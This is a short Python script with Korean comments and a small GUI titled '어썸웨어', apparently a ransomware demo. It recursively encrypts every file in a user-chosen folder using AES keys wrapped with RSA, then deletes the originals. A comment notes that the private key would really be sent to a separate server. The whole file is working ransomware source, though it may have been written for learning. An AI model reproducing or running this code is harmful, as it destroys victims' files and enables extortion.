from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import filedialog
import os

def make_keys():
    key = RSA.generate(2048) #키 생성
    private_key = key.export_key() #비공개 키 추출
    public_key = key.publickey().export_key() #공개 키 추출
    with open("private.pem", "wb") as f: #비공개 키만 따로 저장 (예제라서 파일로 저장했지 실제론 따른 서버 같은 곳으로 보내야함)
        f.write(private_key)
    return public_key

def encrypt_file(file_path, rsa_cipher):
    aes_key = get_random_bytes(32) # AES 키 생성 (랜덤으로)
    cipher = AES.new(aes_key, AES.MODE_EAX) # AES cipher 생성 EAX를 사용했슴다. 이게 CBC 보다 보안성이 높음요
    with open(file_path, 'rb') as f: 
        file_data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(file_data) # EAX방식으로 암호화하면 암호화된 데이터와 tag를 반환해줍니다.
    enc_aes_key = rsa_cipher.encrypt(aes_key) # 이제 AES 키는 암호화해서
    with open(file_path + '.enc', 'wb') as enc_file:
        for data in (cipher.nonce, tag, enc_aes_key, ciphertext): # 최종 파일에 다 때리박아줍니다.
            enc_file.write(data)
    os.remove(file_path) # 기존 파일은 삭제

def select_folder(): # 폴더 선택
    folder_path = filedialog.askdirectory()
    if folder_path:
        path_entry.insert(0, folder_path)

def get_file_paths(folder_path): # 폴더 주소 받아서 그 하위 파일들을 전부 list형태로 저장하고 반환하는 함수
    file_paths = []
    for root, directories, files in os.walk(folder_path): # 어떻게 함수 이름이 walk ㅋㅋ
        for filename in files:
            file_paths.append(os.path.join(root, filename))
    return file_paths

def enc_folder():
    rsa_cipher = PKCS1_OAEP.new(RSA.import_key(make_keys())) # 얘 위치 일로 옮겼습니다!!
    folder_path = path_entry.get() # 파일 주소 받아와서
    for data in get_file_paths(folder_path): # 암호화 ㄱㄱ
        encrypt_file(data, rsa_cipher)
    print("Done!")
 

root = tk.Tk()
root.title("어썸웨어")

path_entry = tk.Entry(root, width=100)
path_entry.grid(row=0, column=0, padx=10, pady=20)

select_button = tk.Button(root, text="폴더 선택", command=select_folder)
select_button.grid(row=0, column=1, padx=10, pady=20)

enc_button = tk.Button(root, text="암호화", width=100, command=enc_folder)
enc_button.grid(row=1, column=0, columnspan=2, padx=10, pady=20)

root.mainloop()